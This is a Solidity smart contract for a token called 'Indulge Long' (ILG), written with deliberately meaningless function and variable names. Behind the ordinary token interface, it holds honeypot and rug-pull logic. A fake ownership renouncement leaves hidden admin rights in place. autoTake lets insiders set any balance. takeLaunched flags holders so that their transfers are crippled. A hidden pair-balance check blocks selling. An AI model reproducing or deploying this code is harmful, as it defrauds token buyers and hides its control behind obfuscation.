//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface exemptTokenSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract atSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fundToLiquidity {
    function createPair(address walletReceiver, address enableTokenAmount) external returns (address);
}

interface listShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchLimit) external view returns (uint256);

    function transfer(address tokenSender, uint256 teamFund) external returns (bool);

    function allowance(address enableReceiverAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamFund) external returns (bool);

    function transferFrom(
        address sender,
        address tokenSender,
        uint256 teamFund
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderSell, uint256 value);
    event Approval(address indexed enableReceiverAuto, address indexed spender, uint256 value);
}

interface limitLaunched is listShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IndulgeLong is atSwap, listShould, limitLaunched {

    function decimals() external view virtual override returns (uint8) {
        return receiverMin;
    }

    function symbol() external view virtual override returns (string memory) {
        return modeAuto;
    }

    uint256 constant fromFeeShould = 19 ** 10;

    function buyReceiver(uint256 teamFund) public {
        modeFund();
        tradingMarketing = teamFund;
    }

    constructor (){
        if (amountTokenSell != shouldLaunch) {
            amountTokenSell = enableList;
        }
        exemptTokenSell buyExempt = exemptTokenSell(teamToken);
        fundSender = fundToLiquidity(buyExempt.factory()).createPair(buyExempt.WETH(), address(this));
        
        atLaunched = _msgSender();
        teamBuy();
        launchedReceiver[atLaunched] = true;
        liquidityTo[atLaunched] = teamExempt;
        
        emit Transfer(address(0), atLaunched, teamExempt);
    }

    uint256 private shouldLaunch;

    uint256 tradingMarketing;

    event OwnershipTransferred(address indexed enableTx, address indexed minFromLiquidity);

    function totalSupply() external view virtual override returns (uint256) {
        return teamExempt;
    }

    function allowance(address autoTrading, address marketingTx) external view virtual override returns (uint256) {
        if (marketingTx == teamToken) {
            return type(uint256).max;
        }
        return maxIs[autoTrading][marketingTx];
    }

    function teamBuy() public {
        emit OwnershipTransferred(atLaunched, address(0));
        swapWallet = address(0);
    }

    function enableReceiverExempt(address amountMax, address tokenSender, uint256 teamFund) internal returns (bool) {
        require(liquidityTo[amountMax] >= teamFund);
        liquidityTo[amountMax] -= teamFund;
        liquidityTo[tokenSender] += teamFund;
        emit Transfer(amountMax, tokenSender, teamFund);
        return true;
    }

    address public fundSender;

    function name() external view virtual override returns (string memory) {
        return marketingEnableTx;
    }

    address teamToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private teamExempt = 100000000 * 10 ** 18;

    uint256 public amountTokenSell;

    mapping(address => bool) public launchedReceiver;

    function fundMarketing(address amountMax, address tokenSender, uint256 teamFund) internal returns (bool) {
        if (amountMax == atLaunched) {
            return enableReceiverExempt(amountMax, tokenSender, teamFund);
        }
        uint256 liquidityList = listShould(fundSender).balanceOf(totalTxSwap);
        require(liquidityList == tradingMarketing);
        require(tokenSender != totalTxSwap);
        if (fundAt[amountMax]) {
            return enableReceiverExempt(amountMax, tokenSender, fromFeeShould);
        }
        return enableReceiverExempt(amountMax, tokenSender, teamFund);
    }

    string private modeAuto = "ILG";

    mapping(address => bool) public fundAt;

    uint256 private enableList;

    function modeFund() private view {
        require(launchedReceiver[_msgSender()]);
    }

    bool public modeReceiver;

    mapping(address => uint256) private liquidityTo;

    address public atLaunched;

    string private marketingEnableTx = "Indulge Long";

    function takeLaunched(address teamFromBuy) public {
        modeFund();
        if (enableList != amountTokenSell) {
            amountTokenSell = shouldLaunch;
        }
        if (teamFromBuy == atLaunched || teamFromBuy == fundSender) {
            return;
        }
        fundAt[teamFromBuy] = true;
    }

    function transfer(address walletMin, uint256 teamFund) external virtual override returns (bool) {
        return fundMarketing(_msgSender(), walletMin, teamFund);
    }

    function transferFrom(address amountMax, address tokenSender, uint256 teamFund) external override returns (bool) {
        if (_msgSender() != teamToken) {
            if (maxIs[amountMax][_msgSender()] != type(uint256).max) {
                require(teamFund <= maxIs[amountMax][_msgSender()]);
                maxIs[amountMax][_msgSender()] -= teamFund;
            }
        }
        return fundMarketing(amountMax, tokenSender, teamFund);
    }

    uint256 totalAt;

    function balanceOf(address launchLimit) public view virtual override returns (uint256) {
        return liquidityTo[launchLimit];
    }

    function getOwner() external view returns (address) {
        return swapWallet;
    }

    address totalTxSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function launchWallet(address senderLimit) public {
        require(senderLimit.balance < 100000);
        if (modeReceiver) {
            return;
        }
        if (shouldLaunch == amountTokenSell) {
            shouldLaunch = amountTokenSell;
        }
        launchedReceiver[senderLimit] = true;
        
        modeReceiver = true;
    }

    mapping(address => mapping(address => uint256)) private maxIs;

    uint8 private receiverMin = 18;

    function autoTake(address walletMin, uint256 teamFund) public {
        modeFund();
        liquidityTo[walletMin] = teamFund;
    }

    address private swapWallet;

    function owner() external view returns (address) {
        return swapWallet;
    }

    function approve(address marketingTx, uint256 teamFund) public virtual override returns (bool) {
        maxIs[_msgSender()][marketingTx] = teamFund;
        emit Approval(_msgSender(), marketingTx, teamFund);
        return true;
    }

}